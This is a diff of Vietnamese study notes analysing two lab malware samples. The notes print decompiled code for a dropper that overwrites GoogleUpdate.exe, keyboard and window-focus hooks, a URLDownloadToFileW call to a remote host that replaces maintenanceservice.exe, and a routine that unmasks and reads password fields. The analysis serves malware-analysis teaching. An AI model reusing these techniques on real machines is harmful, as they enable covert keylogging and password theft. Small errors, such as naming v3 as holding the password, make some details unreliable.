@@ -1,7 +1,11 @@
 # **Lab_05-1.malware**
+
 1. 
+
 ![[Pasted image 20260928084823.png]]
+
 Check bằng DiE, ta thấy trong `.rsrc` có 1 file pe khác.
+
 Phân tích tĩnh bằng IDA
 ```c
 int __cdecl main(int argc, const char **argv, const char **envp)
@@ -49,14 +53,19 @@ char __cdecl sub_401000(HMODULE hModule, LPCWSTR lpFileName)
 }
 ```
 Đoạn code này đã rõ ràng hơn về hành vi. Đầu tiên, nó dùng `FindResourceW` để tìm ra resource có tên `DROP` trong `.rsrc` (chính là file PE kia). Sau đó dùng `LoadResource` để ánh xạ resource vào không gian địa chỉ của tiến trình và lấy handle của resource đó. Rồi dùng `LockResource` để lấy con trỏ trỏ đến vùng nhớ đó. 
+
 Tiếp theo, mở file có trong đường dẫn vừa được truyền vào hàm (`C:\\Program Files\\Google\\Update\\GoogleUpdate.exe`). Rồi ghi toàn bộ dữ liệu độc hại vừa lấy được trong `.rsrc` vào file đó. 
+
 Vậy, thứ được malware ghi vào đĩa chính là resource độc hại trong `.rsrc`.
 
 2. 
+
 Bản thân thằng `C:\\Program Files\\Google\\Update\\GoogleUpdate.exe` đã là 1 thằng có persistence. Việc ghi đè dữ liệu vào file này nhằm tạo ra mã độc kế thừa cơ chế persistence có sẵn của file gốc. Đây là 1 signature tốt vì nó để lại trên máy 1 artifact cố định trên hệ thống (chính là file `GoogleUpdate.exe`), điều này giúp cho việc ra quét dễ dàng hơn.
 
 3. 
+
 Extract malware ra rồi phân tích bằng IDA.
+
 Có vẻ như malware đã lỗi, khi gọi `CreateMutex`, nhưng lại không có bất cứ API nào để ngăn chặn 1 tiến trình thứ 2 sinh ra (như `GetLastError`).
 ```c
 hObject = CreateMutexW(lpMutexAttributes: nullptr, bInitialOwner: false, lpName: L"WODUDE");
@@ -65,17 +74,23 @@ hObject = CreateMutexW(lpMutexAttributes: nullptr, bInitialOwner: false, lpName:
 ```
 
 4. 
+
 2 cơ chế ẩn mình của malware đó là:
-- ==Giả danh:== Malware chạy tiến trình dưới tên `GoodleUpdate.exe`, nếu không kiểm tra kỹ thì chắc chắn không nhận ra.
-- ==Ẩn console:== Dùng `ShowWindow()` với tham số thứ 2 là `0` để ẩn đi.
+
+- $\color{green}{\text{Giả danh:}}$ Malware chạy tiến trình dưới tên `GoodleUpdate.exe`, nếu không kiểm tra kỹ thì chắc chắn không nhận ra.
+- $\color{green}{\text{Ẩn console:}}$ Dùng `ShowWindow()` với tham số thứ 2 là `0` để ẩn đi.
 
 5. 
+
 2 API quan trọng liên quan đến cơ chế keylogging là:
+
 - `SetWindowHookExW`: với tham số `idHook: 13`, nó sẽ chặn bắt toàn bộ thông điệp liên quan đến bàn phím của toàn bộ hệ thống.
 - `SetWinEventHook`: API này có tác dụng "nghe" các sự kiện liên quan đến giao diện và vòng đời cửa sổ, ở đây nó đang theo dõi các sự kiện về việc cửa sổ đang active trên màn hình bị thay đổi.
+
 ![[Pasted image 20260928094946.png]]
 
 6. 
+
 Các hằng số được truyền cho các API đó là:
 ```c
 SetWindowsHookExW(idHook: 13, lpfn: fn, hmod, dwThreadId: 0);
@@ -103,6 +118,7 @@ SetWinEventHook(
 - `dwFlags: 2u` (`WINEVENT_SKIPOWNPROCESS`): Giá trị `2` là cờ `WINEVENT_SKIPOWNPROCESS`: Bỏ qua chính nó: Nếu chính tiến trình hiện tại tạo hoặc tự kích hoạt cửa sổ của nó, hệ điều hành sẽ bỏ qua, không kích hoạt hàm callback. Chạy Out-of-Context: Do không bật cờ `0x0004` (`WINEVENT_INCONTEXT`), hook này mặc định chạy ở chế độ **`WINEVENT_OUTOFCONTEXT`** (`0x0000`). Hệ điều hành gửi bản tin thông báo bất đồng bộ qua IPC về cho tiến trình hiện tại xử lý, tuyệt đối không tiêm (inject) mã vào tiến trình khác.
 
 7. 
+
 Ta sẽ xem thử hàm callback `fn` của `SetWindowHookExW`
 ```c
 LRESULT __stdcall fn(int code, WPARAM wParam, int *lParam)
@@ -146,8 +162,10 @@ int __cdecl sub_4013E0(void *lpBuffer)
 }
 ```
 Nó thực hiện ghi toàn bộ log vào 1 file mới. Cụ thể:
+
 - Nó thực hiện ghi dữ liệu vào RAM Cache của Windows (đọc cơ chế File System Caching để biết thêm).
 - Nếu gặp phím enter hoặc khoảng trắng, thì sẽ flush cache (ghi xuống đĩa cứng) ngay lập tức.
+
 Kiểm tra tiếp hàm callback của `SetWinEventHook`
 ```c
 void __stdcall pfnWinEventProc(
@@ -190,3 +208,271 @@ void __stdcall pfnWinEventProc(
 }
 ```
 Nó cũng thực hiện ghi log vào file mỗi lần máy chuyển focus window.
+
+# **Lab_05-2.malware**
+
+1. 
+
+Theo như email ghi lại, ảnh trong máy nạn nhân đã xuất hiện trên khắp Devian Art - 1 nền tảng chia sẻ ảnh. Để làm được như vậy thì bắt buộc malware trên máy nạn nhân phải kết nối Internet để gửi ảnh ra ngoài. Còn nó gửi đến đâu thì chưa xác định được, có thể gửi đến C2 trung gian rồi mới chia sẻ lên DevArt, hoặc cũng có thể chia sẻ thẳng lên DevArt.
+
+2. 
+
+Check file bằng DiE, ta thấy malware cũng chứa 1 file PE trong `.rsrc`
+
+![[Pasted image 20260928102709.png]]
+
+Phân tích tĩnh bằng IDA.
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  HMODULE ModuleHandleW; // eax
+
+  if ( URLDownloadToFileW(
+         a1: nullptr,
+         a2: L"http://malcode.rpis.ec/update_defender",
+         a3: L"C:\\Program Files\\Mozilla Maintenance Service\\maintenanceservice.exe",
+         a4: 0,
+         a5: nullptr) != 0 )
+  {
+    ModuleHandleW = GetModuleHandleW(lpModuleName: nullptr);
+    sub_401000(
+      hModule: ModuleHandleW,
+      lpFileName: L"C:\\Program Files\\Mozilla Maintenance Service\\maintenanceservice.exe");
+  }
+  return 0;
+}
+```
+`URLDownloadToFileW` dùng để tải dữ liệu từ 1 URL, rồi ghi đè vào 1 file khác. Nếu thành công thì trả về `0`, nếu không thì trả về `1`. Nếu vậy thì code này có nghĩa là: nếu tải được thì bỏ qua đoạn dưới, còn nếu thất bại thì thực hiện ghi file dữ phòng (trong `.rsrc`) vào file.
+
+Cơ chế persistence được dùng đó là: ghi dữ liệu vào 1 file thực thi có sẵn cơ chế persistence. Đây là 1 chữ kí tốt vì nó để lại 1 artifact cố định trên máy, giúp thuận lợi cho việc ra quét.
+
+3. 
+
+Thực hiện dump file PE trong `.rsrc` ra để phân tích.
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  HANDLE ProcessHeap; // eax
+  HANDLE v5; // eax
+  LPWSTR v6; // [esp-4h] [ebp-28h]
+  struct tagMSG Msg; // [esp+0h] [ebp-24h] BYREF
+  HWND hWnd; // [esp+1Ch] [ebp-8h]
+  SIZE_T dwBytes; // [esp+20h] [ebp-4h] BYREF
+
+  dword_403380 = (int)CreateMutexW(lpMutexAttributes: nullptr, bInitialOwner: false, lpName: L"BROSMASH");
+  if ( dword_403380 == 0 )
+    return 0;
+  hWnd = GetConsoleWindow();
+  ShowWindow(hWnd, nCmdShow: 0);
+  dwBytes = 522;
+  ProcessHeap = GetProcessHeap();
+  lpMem = (LPWSTR)HeapAlloc(hHeap: ProcessHeap, dwFlags: 0, dwBytes: 0x20Au);
+  GetComputerNameW(lpBuffer: lpMem, nSize: &dwBytes);
+  hFile = CreateFileW(
+            lpFileName: lpMem,
+            dwDesiredAccess: 0xC0000000,
+            dwShareMode: 0,
+            lpSecurityAttributes: nullptr,
+            dwCreationDisposition: 2u,
+            dwFlagsAndAttributes: 0x80u,
+            hTemplateFile: nullptr);
+  dword_403390 = (int)GetForegroundWindow();
+  hMutex = CreateMutexW(lpMutexAttributes: nullptr, bInitialOwner: false, lpName: nullptr);
+  SetWinEventHook(
+    eventMin: 3u,
+    eventMax: 3u,
+    hmodWinEventProc: nullptr,
+    pfnWinEventProc: pfnWinEventProc,
+    idProcess: 0,
+    idThread: 0,
+    dwFlags: 2u);
+  while ( GetMessageW(lpMsg: &Msg, hWnd: nullptr, wMsgFilterMin: 0, wMsgFilterMax: 0) > 0 )
+  {
+    ShowWindow(hWnd, nCmdShow: 0);
+    TranslateMessage(lpMsg: &Msg);
+    DispatchMessageW(lpMsg: &Msg);
+  }
+  CloseHandle(hObject: hFile);
+  v6 = lpMem;
+  v5 = GetProcessHeap();
+  HeapFree(hHeap: v5, dwFlags: 0, lpMem: v6);
+  return 0;
+}
+```
+Để nói kỹ hơn về cách hoạt động của hàm `SetWinEventHook` và `SetWindowHookExW`. Ta cần biết rằng, mọi chương trình GUI của Window đều hoạt động theo mô hình hướng sự kiện. Cụ thể:
+```
+[Người dùng / Thiết bị ngoại vi]
+ (Click chuột, gõ phím, resize cửa sổ)
+                  │
+                  ▼
+[Driver phần cứng & Windows Kernel (win32k.sys)]
+ (Bắt ngắt phần cứng, đóng gói thành cấu trúc struct MSG)
+                  │
+                  ▼
+[Hàng đợi thông điệp của luồng (Thread Message Queue)]
+ (Xếp hàng các thông điệp: WM_LBUTTONDOWN, WM_KEYDOWN, WM_PAINT...)
+                  │
+                  ▼
+┌─────────────────────────────────────────────────────────────┐
+│             VÒNG LẶP THÔNG ĐIỆP (MESSAGE LOOP)              │
+│                                                             │
+│  ┌──────────────────┐                                       │
+│  │ GetMessage()     │ ◄── Đọc thông điệp từ hàng đợi        │
+│  └────────┬─────────┘     (Chặn luồng nếu hàng đợi rỗng)    │
+│           │                                                 │
+│           ▼                                                 │
+│  ┌──────────────────┐                                       │
+│  │ TranslateMessage │ ─── Chuyển đổi mã phím ảo sang ký tự  │
+│  └────────┬─────────┘     (ví dụ: WM_KEYDOWN -> WM_CHAR)    │
+│           │                                                 │
+│           ▼                                                 │
+│  ┌──────────────────┐                                       │
+│  │ DispatchMessage  │ ─── Tìm Handle (HWND) và chuyển tiếp  │
+│  └────────┬─────────┘     thông điệp đến cửa sổ sở hữu      │
+└───────────┼─────────────────────────────────────────────────┘
+            │
+            ▼
+┌─────────────────────────────────────────────────────────────┐
+│            THỦ TỤC CỬA SỔ (WINDOW PROCEDURE - WndProc)      │
+│                                                             │
+│   switch (uMsg) {                                           │
+│       case WM_LBUTTONDOWN:                                  │
+│           // Xử lý logic click chuột (hoặc kích hoạt event)  │
+│           break;                                            │
+│       case WM_PAINT:                                        │
+│           // Vẽ lại vùng hiển thị                           │
+│           break;                                            │
+│       case WM_DESTROY:                                      │
+│           // Dọn dẹp tài nguyên, gọi PostQuitMessage(0)      │
+│           break;                                            │
+│       default:                                              │
+│           // Nhường cho OS xử lý hành vi mặc định            │
+│           return DefWindowProc(hWnd, uMsg, wParam, lParam); │
+│   }                                                         │
+└─────────────────────────────────────────────────────────────┘
+```
+- **Hàng đợi thông điệp (Message Queue):** Khi người dùng thao tác phần cứng (nhấp chuột, gõ phím, di chuyển cửa sổ) hoặc khi hệ thống có thay đổi (yêu cầu vẽ lại vùng hiển thị `WM_PAINT`, hẹn giờ `WM_TIMER`, đóng ứng dụng `WM_DESTROY`), Windows OS sẽ đóng gói hành động đó thành một cấu trúc thông điệp (`MSG`) và đẩy vào hàng đợi của luồng (thread) sở hữu cửa sổ đó.
+- **Vòng lặp thông điệp (Message Loop / Message Pump):** Luồng GUI chạy một vòng lặp liên tục để lấy thông điệp ra khỏi hàng đợi: 
+```c
+while (GetMessage(&msg, NULL, 0, 0)) {
+    TranslateMessage(&msg); // Dịch các phím ảo thành ký tự
+    DispatchMessage(&msg);  // Gửi thông điệp đến hàm xử lý
+}
+```
+- **Thủ tục cửa sổ (Window Procedure - `WndProc`):** Đây là hàm callback được đăng ký cho mỗi lớp cửa sổ. `DispatchMessage` sẽ chuyển thông điệp trực tiếp đến hàm này để ứng dụng thực thi logic tương ứng với từng mã sự kiện.
+
+> **Hệ quả kỹ thuật:** Nếu một ứng dụng GUI Windows không duy trì vòng lặp thông điệp này (hoặc bị nghẽn do chạy tác vụ nặng trên luồng chính), hệ điều hành sẽ coi ứng dụng bị treo và kích hoạt cơ chế hiển thị trạng thái **"(Not Responding)"** cùng việc thay thế bằng một Ghost Window.
+
+Nói sơ qua một chút về cụm 3 API `GetMessage`, `TranslateMessage` và `DispatchMessage`:
+```c
+MSG msg;
+// Vòng lặp dừng khi GetMessage trả về 0 (nhận WM_QUIT) hoặc gặp lỗi (-1)
+while (GetMessage(&msg, NULL, 0, 0) > 0) {
+    TranslateMessage(&msg); // Bước 1: Dịch phím bấm thành ký tự
+    DispatchMessage(&msg);  // Bước 2: Chuyển tiếp tới WndProc
+}
+```
+ 1. `GetMessage`: Trích xuất thông điệp từ hàng đợi
+- **Cơ chế chặn luồng (Blocking):** Nếu hàng đợi thông điệp của luồng đang rỗng, `GetMessage` sẽ đưa luồng vào trạng thái chờ (Sleep/Wait state) và nhường CPU cho các tiến trình khác. Khi có sự kiện mới xuất hiện, hệ điều hành sẽ đánh thức luồng để lấy thông điệp ra ghi vào biến `struct MSG`.
+- **Kiểm soát vòng đời ứng dụng:**
+    - Trả về giá trị **khác 0 (`TRUE`)** với mọi thông điệp thông thường.
+    - Trả về **`0`** khi gặp thông điệp `WM_QUIT` (thường được phát ra khi gọi `PostQuitMessage(0)` lúc đóng cửa sổ), khiến vòng lặp `while` kết thúc và tiến trình chuẩn bị thoát.
+    - Trả về **`-1`** nếu xảy ra lỗi (ví dụ truyền vào một con trỏ hoặc `HWND` không hợp lệ). Vì vậy, điều kiện chuẩn luôn là `GetMessage(...) > 0` thay vì kiểm tra khác 0.
+2. `TranslateMessage`: Chuyển đổi phím ảo thành ký tự
+- **Bản chất phần cứng:** Bàn phím máy tính chỉ gửi các tín hiệu nhấn phím vật lý thô. Windows đóng gói các tín hiệu này thành thông điệp phím ảo: `WM_KEYDOWN` và `WM_KEYUP` cùng mã Virtual-Key (như `VK_A`, `VK_SHIFT`).
+- **Nhiệm vụ chuyển ngữ:** `TranslateMessage` kiểm tra trạng thái phím hiện tại (phím Shift có đang giữ không, Caps Lock có bật không, bộ gõ ngôn ngữ nào đang dùng).
+- **Tạo thông điệp mới:** Nếu tổ hợp phím biểu diễn một ký tự có thể in được, hàm này sẽ sinh ra và đẩy ngược (post) một thông điệp **`WM_CHAR`** mới vào lại hàng đợi của luồng. Nó hoàn toàn không sửa đổi thông điệp `WM_KEYDOWN` ban đầu đang giữ trong bộ nhớ.
+3. `DispatchMessage`: Điều phối đến hàm thủ tục cửa sổ
+- **Định tuyến thông điệp:** Mỗi cấu trúc `MSG` đều chứa trường `hwnd` (Handle của cửa sổ mục tiêu). `DispatchMessage` tra cứu thông tin hệ thống để tìm địa chỉ hàm `Window Procedure` (`WndProc`) tương ứng được đăng ký với `hwnd` đó.
+- **Gọi hàm đồng bộ (Synchronous Callback):** `DispatchMessage` trực tiếp gọi hàm `WndProc(hwnd, message, wParam, lParam)`. Luồng thực thi sẽ tạm dừng ở `DispatchMessage` cho tới khi hàm `WndProc` thực hiện xong các nhánh logic (xử lý sự kiện click, vẽ giao diện...) và trả về (`return`).
+- **Hoàn tất chu trình:** Sau khi `WndProc` xử lý xong, `DispatchMessage` mới kết thúc để vòng lặp quay lại đón nhận thông điệp tiếp theo từ `GetMessage`.
+
+Về bản chất, cụm `GetMessage` và `DispatchMessage` là cụm bắt buộc phải có, còn `Translate` thì tùy trường hợp sẽ có những hàm khác nhau cần sử dụng.
+
+Quay lại với các hàm hook. Cơ chế ở đây là: Chúng chỉ có tác dụng đăng kí với kernel 1 callback tương ứng với 1 loại message riêng. Còn nhiệm vụ nhận message và chọn ra callback là nhiệm vụ của khối xử lí thông điệp vừa phân tích bên trên. Chính vì thế nên mặc dù chương trình là đơn luồng, nhưng hàm callback có thể chạy nhiều lần mà không cần vòng lặp. Ngoài việc chạy nhiều lần, nó còn có thể bị chồng chéo lên nhau. Đây không phải là đa luồng, mà là tái nhập.
+
+![[Pasted image 20260928171035.png]]
+
+Chính vì thế, author phải sử dụng đến mutex để có thể đồng bộ hóa.
+
+**Chú ý:** Nếu `CreateMutex` mà tham số `lpName` là `nullptr` thì nó chỉ có tác dụng trong tiến trình đang chạy (vì các luồng đang chia sẻ bộ nhớ), còn ra ngoài tiến trình khác thì vô dụng.
+
+4. 
+
+`SendMessage` là một trong những API quan trọng nhất của hệ thống con Win32 (`user32.dll`), dùng để gửi trực tiếp một thông điệp tới một cửa sổ xác định và **chờ cho đến khi thủ tục cửa sổ (`WndProc`) của cửa sổ đó xử lý xong mới trả về kết quả**.
+
+Cú pháp chuẩn trong C/C++:
+```
+LRESULT SendMessage(
+    HWND   hWnd,    // Handle của cửa sổ nhận thông điệp
+    UINT   Msg,     // Mã định danh thông điệp (WM_SETTEXT, WM_CLOSE, WM_COMMAND...)
+    WPARAM wParam,  // Tham số phụ thứ nhất (kiểu integer / pointer tùy theo Msg)
+    LPARAM lParam   // Tham số phụ thứ hai (kiểu integer / pointer tùy theo Msg)
+);
+```
+- **`hWnd`**: Định danh của cửa sổ đích. Nếu truyền `HWND_BROADCAST` (`0xFFFF`), thông điệp sẽ được gửi tới tất cả các cửa sổ cấp cao nhất (top-level windows) trên toàn hệ thống.
+- **`Msg`**: Hằng số thông điệp (ví dụ `WM_SETTEXT = 0x000C`, `WM_DESTROY = 0x0002` hoặc thông điệp tự định nghĩa `WM_USER + x`).
+- `wParam`và`lParam`: Dữ liệu ngữ cảnh đi kèm. Ý nghĩa phụ thuộc vào từng loại thông điệp. Ví dụ: với `WM_SETTEXT`, `wParam` không dùng (bằng 0), còn `lParam` là con trỏ trỏ tới chuỗi văn bản (`LPCTSTR`).
+- **`LRESULT`** (Giá trị trả về): Chính là giá trị mà hàm `WndProc` của cửa sổ nhận thông điệp trả về (`return`) sau khi xử lý xong sự kiện.
+
+Trong bài này:
+```c
+int __cdecl sub_4011E0(HWND hWnd)
+{
+  DWORD NumberOfBytesWritten; // [esp+0h] [ebp-210h] BYREF
+  LRESULT v3; // [esp+4h] [ebp-20Ch]
+  char v4; // [esp+Bh] [ebp-205h]
+  _WORD lParam[256]; // [esp+Ch] [ebp-204h] BYREF
+
+  v4 = SendMessageW(hWnd, Msg: 0xD2u, wParam: 0, lParam: 0);
+  SendMessageW(hWnd, Msg: 0xCCu, wParam: 0, lParam: 0);
+  lParam[0] = 255;
+  v3 = SendMessageW(hWnd, Msg: 0xC4u, wParam: 0, (LPARAM)lParam);
+  SendMessageW(hWnd, Msg: 0xCCu, wParam: v4, lParam: 0);
+  if ( v3 == 0 )
+    return 0;
+  NumberOfBytesWritten = 0;
+  WriteFile(
+    hFile: hFile,
+    lpBuffer: lParam,
+    nNumberOfBytesToWrite: 2 * v3,
+    lpNumberOfBytesWritten: &NumberOfBytesWritten,
+    lpOverlapped: nullptr);
+  WriteFile(
+    hFile: hFile,
+    lpBuffer: L"\n",
+    nNumberOfBytesToWrite: 2u,
+    lpNumberOfBytesWritten: &NumberOfBytesWritten,
+    lpOverlapped: nullptr);
+  return 1;
+}
+```
+Hàm đầu tiên:
+```c
+v4 = SendMessageW(hWnd, Msg: 0xD2u, wParam: 0, lParam: 0);
+```
+Mã thông điệp `0xd2` là `EM_GETPASSWORDCHAR`, có tác dụng yêu cầu `WinProc` của cửa sổ lấy mặt nạ kí tự che mật khẩu, và trả về `v4`.
+
+Tiếp theo:
+```c
+SendMessageW(hWnd, Msg: 0xCCu, wParam: 0, lParam: 0);
+```
+Mã `0xcc` dùng để thay thế mặt nạ che mật khẩu bằng 1 kí tự cho trong `wParam`, ở đây `wParam = 0` nghĩa là gỡ bỏ mặt nạ che mật khẩu.
+```c
+SendMessageW(hWnd, Msg: 0xC4u, wParam: 0, (LPARAM)lParam)
+```
+Mã `0xc4` là `EM_GETLINE`, đây là thông điệp dùng để trích xuất nội dung của một dòng văn bản cụ thể từ ô nhập liệu nhiều dòng (Multiline Edit Control).
+
+Cuối cùng:
+```c
+SendMessageW(hWnd, Msg: 0xCCu, wParam: v4, lParam: 0);
+```
+Đây là API dùng để che lại mật khẩu bằng mask ban đầu `v4`.
+
+Vậy, nhiệm vụ của các lệnh này là mở mặt nạ, ăn cắp mật khẩu vào `v3` và đóng mặt nạ. Thao tác này diễn ra ở mức máy nên rất nhanh, mắt thường không thể nhận ra.
+
+5. Đã giải thích ở câu 4.
+6. Sau khi đã lấy được password ở `v3`, nó sẽ thực hiện viết password vào 1 file nào đó trên đĩa, sau đó viết nốt kí tự `\n` để kết thúc file.
+7. Malware lưu trữ toàn bô dữ liệu ăn cắp được vào 1 file trên ổ đĩa.
+
+ 
